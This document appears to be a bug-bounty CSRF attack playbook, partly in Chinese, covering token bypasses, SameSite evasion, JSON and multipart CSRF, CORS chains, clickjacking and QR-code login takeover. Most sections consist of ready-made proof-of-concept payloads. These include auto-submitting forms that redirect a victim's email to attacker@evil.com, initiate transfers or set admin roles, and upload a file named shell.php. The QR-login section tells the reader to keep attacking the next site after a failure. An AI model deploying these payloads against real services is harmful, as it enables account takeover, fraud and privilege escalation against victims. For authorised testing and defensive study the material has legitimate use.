# csrf

> **SRC 纪律：** 本文测 **CSRF 写成功** 等仍可作中高（有跨用户/敏感写才报）。  
> 文中出现的 CORS 仅作链路基座理解；**禁止**把 CORS 单独写成主洞报告（`cors-vuln-report-priority`：不挖不写）。

# CSRF — Cross-Site Request Forgery


## 1. CORE CONCEPT

CSRF exploits a victim's active session to perform state-changing requests **from the attacker's origin**.

**Required conditions**:
1. Victim is authenticated (active session cookie)
2. Server identifies session via cookie only (no secondary check)
3. Attacker can predict/construct the valid request
4. Cookie is sent cross-origin (SameSite=None or legacy behavior)

---

## 2. FINDING CSRF TARGETS

**High-value state-changing endpoints**:
```
- Password change         ← account takeover
- Email change            ← account takeover
- Add admin / change role ← privilege escalation
- Bank/payment transfer   ← financial impact
- OAuth app authorization ← hijack oauth flow
- Account deletion
- Two-factor auth disable  
- SSH key / API key addition
- Webhook configuration
- Profile/contact info update
```

---

## 3. TOKEN BYPASS TECHNIQUES

### No Token Present
Simplest case — form simply lacks CSRF token. Check if POST /change-email has any token. If not → trivially exploitable.

### Token Not Validated (most common finding!)
Token exists in request but is never verified server-side:
```
Remove the _csrf_token parameter entirely → does request still succeed?
→ YES → trivial bypass
```

### Token Tied to Session but Not to User
```
Step 1: Log in as UserA → obtain valid CSRF token
Step 2: Log in as UserB in other browser → obtain UserB CSRF token  
Step 3: Use UserB's CSRF token in UserA's session (attacker controls UserB)
→ If server validates token exists but doesn't check if it belongs to the session → bypass
```

### Token in Cookie Only
When server sets CSRF token as cookie and expects it back in a header/form:
```
Set-Cookie: csrf=ATTACKER_CONTROLLED
→ If cookie can be set by subdomain (cookie tossing): set cookie to known value
→ Submit form with known token in header + known token in cookie = bypass
```

### Static or Predictable Token
```
→ Same token across all users/sessions
→ Token = base64(username) or md5(session_id) → reversible
→ Token = timestamp → predictable
```

### Double Submit Cookie Pattern (broken if subdomain trusted)
```
If attacker can write cookies for .target.com from subdomain XSS or cookie tossing:
→ Set csrf_cookie=CONTROLLED on .target.com
→ Submit request with X-CSRF-Token: CONTROLLED
→ Server checks header == cookie → match → bypass
```

---

## 4. SAMESITE BYPASS SCENARIOS

**SameSite=Lax** (modern browser default): cookies sent for top-level GET navigation, NOT for cross-site iframe/form POST.

**Bypass SameSite=Lax via GET method**:
```html
<!-- If server accepts GET for state-changing endpoint: -->
<img src="https://target.com/account/delete?confirm=yes">
<script>document.location = 'https://target.com/transfer?to=attacker&amount=1000';</script>
```

**Bypass via subdomain XSS (SameSite Lax/Strict)**:
```javascript
// XSS on sub.target.com → same-site origin → SameSite cookies sent!
// Use XSS as staging point for CSRF
window.location = 'https://target.com/account/modify?evil=true';
```

**SameSite=None** (legacy or explicit): cookies sent everywhere → classic CSRF applies.

**Cookie issued recently? Lax exemption:**
Chrome has a 2-minute exception where Lax cookies ARE sent on cross-site POSTs if the cookie was just set (for OAuth flows). Race window: set cookie, immediately trigger CSRF within 2 minutes.

---

## 5. CSRF PROOF OF CONCEPT TEMPLATES

### Simple Form POST
```html
<html>
<body>
<form id="csrf" action="https://target.com/account/email/change" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="confirm_email" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

### Auto-click Submit
```html
<body onload="document.forms[0].submit()">
<form action="https://target.com/transfer" method="POST">
  <input name="to" value="attacker_account">
  <input name="amount" value="10000">
</form>
</body>
```

### CSRF via GET (with img tag)
```html
<img src="https://target.com/api/v1/admin/delete-user?id=12345" style="display:none">
```

### CSRF with Custom Header (XMLHttpRequest — same-origin only, defeats naive defenses)
If API requires custom header like `X-CSRF-Token` but also accepts JSON with wildcard CORS — custom headers don't protect if CORS misconfigured:
```javascript
// If Access-Control-Allow-Origin: * with credentials → broken
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/transfer");
xhr.setRequestHeader("Content-Type", "application/json");
xhr.withCredentials = true;  // still need cookie sending
xhr.send('{"to":"attacker","amount":1000}');
```

---

## 6. JSON CSRF

When endpoint accepts `Content-Type: application/json` — fetch() with CORS credentials:

```javascript
// If CORS allows credentials + the endpoint:
fetch('https://target.com/api/v1/change-email', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});
```
**Requires**: `Access-Control-Allow-Origin: https://attacker.com` AND `Access-Control-Allow-Credentials: true`

**If server only accepts `application/json` but no fetch CORS:**
Can't do proper JSON CSRF from HTML form (forms can only send `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`).

**Trick — Content-Type Downgrade**: If server processes `text/plain` body as JSON:
```html
<form enctype="text/plain" method="POST" action="https://target.com/api">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
```
Resulting body: `{"email":"attacker@evil.com","ignore":"="}`

---

## 7. MULTIPART CSRF

When changing `Content-Type` from `application/json` to `multipart/form-data` and request still works:
```html
<form method="POST" action="https://target.com/api/update" enctype="multipart/form-data">
  <input name="email" value="attacker@evil.com">
</form>
```

---

## 8. CSRF + XSS COMBINATION (CSRF Token Bypass)

When CSRF protection is otherwise solid, XSS enables CSRF bypass:
```javascript
// Step 1: XSS reads CSRF token from DOM
var token = document.querySelector('input[name="csrf_token"]').value;
// Step 2: Submit CSRF request with real token
var xhr = new XMLHttpRequest();
xhr.open('POST', '/account/delete', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('confirm=yes&csrf_token=' + token);
```

---

## 9. OAUTH CSRF (STATE PARAMETER MISSING)

OAuth flow without `state` parameter → CSRF on the OAuth authorization:

**Attack**:
1. Attacker initiates OAuth flow, gets authorization code
2. Before exchanging code, stops the flow (captures the redirect URL with code)
3. Sends victim the crafted URL: `https://target.com/oauth/callback?code=ATTACKER_CODE`
4. Victim's browser exchanges the attacker's code → victim's account linked to attacker's OAuth provider

**Impact**: Attacker can log in as victim.

---

## 10. CSRF TESTING CHECKLIST

```
□ Remove CSRF token entirely → does request succeed?
□ Change CSRF token to random value → does request succeed?
□ Use CSRF token from another user's session → does request succeed?
□ Check if GET version of POST endpoint exists
□ Check SameSite attribute of session cookie
□ Test if Content-Type change (json → form → text/plain) still processes
□ JSON CSRF：以「写操作是否跨站成功」为证；勿单独交 CORS 报告（SRC 不挖不写 CORS）
□ Check OAuth flows for missing state parameter
□ QR / 扫码登录：token 能否进 URL、已登录点开是否等于确认（§18）
□ Test referrer-based protection: send request with no Referer header
□ Test referrer-based protection: spoof subdomain in referer
```

---

## 11. JSON CSRF TECHNIQUES

### Method 1: text/plain Disguise

```html
<!-- Browser sends Content-Type: text/plain with JSON-like body -->
<form action="https://target.com/api/role" method="POST" enctype="text/plain">
  <input name='{"role":"admin","ignore":"' value='"}' type="hidden">
  <input type="submit" value="Click me">
</form>
<!-- Resulting body: {"role":"admin","ignore":"="} -->
<!-- Server may parse as JSON if it doesn't strictly check Content-Type -->
```

### Method 2: XHR with Credentials

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/role", true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send('{"role":"admin"}');
</script>
<!-- Only works if CORS allows the origin (misconfigured CORS + CSRF combo) -->
```

### Method 3: fetch() API

```html
<script>
fetch("https://target.com/api/role", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: '{"role":"admin"}'
});
</script>
```

---

## 12. MULTIPART CSRF & CLIENT-SIDE PATH TRAVERSAL

### Multipart File Upload CSRF

```html
<script>
var formData = new FormData();
formData.append("file", new Blob(["malicious content"], {type: "text/plain"}), "shell.php");
formData.append("action", "upload");

fetch("https://target.com/upload", {
  method: "POST",
  credentials: "include",
  body: formData
});
</script>
```

### Client-Side Path Traversal to CSRF (CSPT2CSRF)

```
Normal flow: Frontend fetches /api/user/PROFILE_ID/settings
Attack: Set PROFILE_ID to ../../admin/dangerous-action

Result: Frontend's fetch() hits /api/admin/dangerous-action with victim's cookies
This converts a path traversal into a CSRF-like attack without needing a CSRF token
```

| Aspect | Traditional CSRF | CSPT2CSRF |
|---|---|---|
| Origin | Attacker's site | Same-origin JavaScript |
| Token bypass | Needs token forgery | No token needed (same-origin) |
| SameSite | Blocked by SameSite=Strict | Bypasses SameSite (same site!) |
| Detection | Standard CSRF checks | Requires input validation on path segments |

---

## 13. SAMESITE=LAX ADVANCED BYPASS TECHNIQUES

### 13.1 Top-level navigation via `window.open()` (2-minute window)

Chrome's Lax+POST exception: cookies with `SameSite=Lax` are sent on cross-site POST requests if the cookie was set within the last 2 minutes (exists for OAuth flows).

```javascript
// Attacker page: trigger login to set a fresh cookie, then immediately CSRF
// Step 1: Force victim to visit target (sets fresh session cookie)
window.open('https://target.com/login');
// Step 2: Within 2 minutes, POST to state-changing endpoint
setTimeout(() => {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://target.com/account/change-email';
    form.innerHTML = '<input name="email" value="attacker@evil.com">';
    document.body.appendChild(form);
    form.submit();
}, 5000);
```

### 13.2 302 redirect chain from attacker site

Lax cookies are sent on top-level GET navigations. A redirect chain converts GET into action:

```text
1. Attacker page → 302 redirect to https://target.com/transfer?to=attacker&amount=1000
2. Browser follows redirect as top-level navigation → Lax cookies sent
3. If target accepts GET for state-changing operations → CSRF succeeds
```

### 13.3 Method override: POST disguised as GET

Many frameworks support method override via `_method` parameter:

```text
GET /account/delete?_method=DELETE&confirm=yes HTTP/1.1
GET /transfer?_method=POST&to=attacker&amount=1000 HTTP/1.1
```

Headers that trigger method override:
```text
X-HTTP-Method-Override: POST
X-Method-Override: DELETE
_method=PUT (Rails, Laravel, Symfony)
```

SameSite=Lax allows the GET → framework processes it as POST/DELETE via override → CSRF on "POST-only" endpoints.

---

## 14. ADVANCED JSON CSRF TECHNIQUES

### 14.1 Flash-based Content-Type manipulation (legacy)

Flash (pre-2021) could send arbitrary `Content-Type` headers cross-origin without preflight:

```actionscript
var req:URLRequest = new URLRequest("https://target.com/api/role");
req.method = "POST";
req.contentType = "application/json";
req.data = '{"role":"admin"}';
navigateToURL(req);
```

Legacy but still relevant for older internal applications.

### 14.2 fetch() no-cors mode limitations and workarounds

`fetch()` in `no-cors` mode can send simple requests but cannot set `Content-Type: application/json` (triggers preflight) or read the response.

Workaround — if the server accepts `text/plain` body and parses it as JSON:

```javascript
fetch('https://target.com/api/role', {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {'Content-Type': 'text/plain'},
    body: '{"role":"admin"}'
});
```

### 14.3 Encoding JSON as form-urlencoded

Some backends accept both content types:

```html
<form action="https://target.com/api/role" method="POST">
  <input name="role" value="admin">
  <input name="user_id" value="123">
</form>
```

If the server processes `role=admin&user_id=123` the same as `{"role":"admin","user_id":123}` → CSRF via plain HTML form without CORS preflight.

---

## 15. CSRF + CORS MISCONFIGURATION CHAINS

> **SRC：** 本节只帮助理解「读 token → 再 CSRF 写」。  
> 主洞写 **CSRF / 越权写**；**不要**另交 CORS 报告。

### Reflected Origin + Credentials

```text
1. Target API reflects Origin in Access-Control-Allow-Origin
2. Access-Control-Allow-Credentials: true
3. Attacker page sends credentialed fetch() from https://evil.com
4. Response is readable → CSRF token extracted from response
5. Second request with valid CSRF token → bypass all CSRF defenses
```

```javascript
fetch('https://target.com/api/profile', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
      fetch('https://target.com/api/change-email', {
          method: 'POST',
          credentials: 'include',
          headers: {
              'Content-Type': 'application/json',
              'X-CSRF-Token': data.csrf_token
          },
          body: JSON.stringify({email: 'attacker@evil.com'})
      });
  });
```

### Subdomain XSS → CORS → CSRF

If `*.target.com` is in the CORS allowlist and an XSS exists on any subdomain:
1. Exploit XSS on `blog.target.com`
2. From XSS context, fetch API at `api.target.com` (CORS allows subdomain)
3. Read CSRF token from response
4. Submit state-changing request with valid token

---

## 16. CSRF TOKEN FIXATION (PRE-SESSION TOKENS)

If CSRF tokens are issued before authentication and remain valid after login:

```text
1. Attacker visits target.com → receives CSRF token T1
2. Attacker forces victim's browser to use T1:
   a. Cookie tossing from subdomain
   b. CRLF injection to set csrf_cookie
3. Victim logs in — CSRF token unchanged
4. Attacker submits CSRF request with known T1 → succeeds
```

### Test procedure

```text
□ Obtain CSRF token as unauthenticated user
□ Log in — does the CSRF token change?
□ If unchanged → token fixation: pre-auth token works post-auth
□ Use pre-auth token in a CSRF PoC against authenticated endpoint
```

---

## 17. CLICKJACKING AS CSRF BYPASS

When CSRF protections are solid but `X-Frame-Options` / `frame-ancestors` is missing:

### Attack flow

```text
1. Target page is frameable (no X-Frame-Options / CSP frame-ancestors)
2. Attacker creates transparent iframe overlay
3. Victim sees attacker content, clicks land on target's action button in hidden iframe
4. Click originates from same origin (within iframe) — bypasses CSRF tokens
```

### PoC template

```html
<html>
<body>
<div style="position:relative">
  <iframe src="https://target.com/account/settings"
    style="opacity:0.0001; position:absolute; top:0; left:0;
           width:500px; height:500px; z-index:2;">
  </iframe>
  <button style="position:absolute; top:250px; left:200px; z-index:1;
                 padding:20px; font-size:24px;">
    Click to claim prize!
  </button>
</div>
</body>
</html>
```

### Defense check

```text
□ X-Frame-Options: DENY or SAMEORIGIN header present?
□ CSP: frame-ancestors 'self' or frame-ancestors 'none'?
□ If neither → clickjacking possible → CSRF bypass via iframe
```

---

## 18. 扫码登录 CSRF → 用户接管（短表有指针）

> 本质：已登录用户被骗打开一条 URL，Cookie 自己带过去，等于帮攻击者点了「确认扫码」。  
> 和改密/转账 CSRF 同类，打在「确认扫码」这一下。短表一行指向本节。  
> 进库的是手法，不是某个站的 token 实值。

### 18.1 认什么（开场就能认）

同时出现就当开场几枪：

- 登录页有二维码 / 「用 App 扫码」
- 不登录调生成接口，回包里有 `token`（或 ticket / scene / sid），常带过期时间
- 同一站还有登录 URL 吃 query：`/login?token=`、`?ticket=`、`agentType=` 之类

### 18.2 链怎么穿（两边浏览器）

```
攻击者（无痕、未登录）
  → 打开扫码登录
  → 抓住生成 token 的请求/响应（常见 path 含 qrcode / qr / gen_login_token / is_token_login）
  → 把 token 塞进登录页 URL

受害者（已登录同一站点）
  → 打开这条 URL（顶栏跳转即可，和 SameSite=Lax 顶栏 GET 对得上）
  → 服务端把该 token 绑到他的号上（等于扫码确认）

攻击者无痕
  → 轮询/刷新后变成受害者的号
```

构造形态（字段名按现场改，不要死抄）：

```
https://目标登录页?token=刚才拿到的token
https://目标登录页?agentType=数字&token=...&lang=...
```

### 18.3 出什么算成

攻击者**未登录**的那一端出现对方头像/账号，能当对方用。  
只证明「已登录的人打开了链接」不算；必须无痕那边登录态过来。

### 18.4 假点（形态不是洞，不是「这站没打穿」）

- token 过期后再点，两边都没登录
- 点开只重新出一张码，不把 token 绑到当前已登录号
- 必须手机 App 真扫，URL 打开不算确认

这站 401 / token 换了一串没中 → 只说明这站不行，**下一站同类照样打**，不删短表这行。

### 18.5 和邻近手法别混

| 本条 | 别当成 |
|------|--------|
| 确认扫码这一下的 CSRF | 不登录直接读业务接口 |
| 受害者要已登录（要会话） | 无密码登录绕过、空密进后台 |
| GET 登录 URL 就能确认 | 必须 POST + 自定义头才改状态的 CSRF（那种还要另测） |

OAuth 缺 `state` 把 code 丢给受害者（§9）是近亲：都是「已登录的人打开攻击者准备好的回调」。扫码这条认的是 **QR token**，不是 authorization code。

### 18.6 开场探针（有入口就打，半分钟级）

1. 不登录打开扫码登录，抓生成 token 的接口  
2. 看响应有没有 token / 过期字段；看前端会不会拼 `/login?token=`  
3. 自己已登录的另一个配置打开拼好的 URL  
4. 回未登录端看是否变成自己的号  

第 4 步成立 → 按 `src-value` 写接管报告。密钥/token 实值只写报告，不写进短表。

### 18.7 社交 App 内置浏览器（见了再打）

页是在社交 App WebView 里打开、且会按域自动带 `pskey` / 静默 OAuth 时：同域 XSS 可以顺手把凭证带出去，或替已登录用户点确认扫码。**不是每站必打**；没有这层壳，仍只打上面的扫码 CSRF。不进短表。
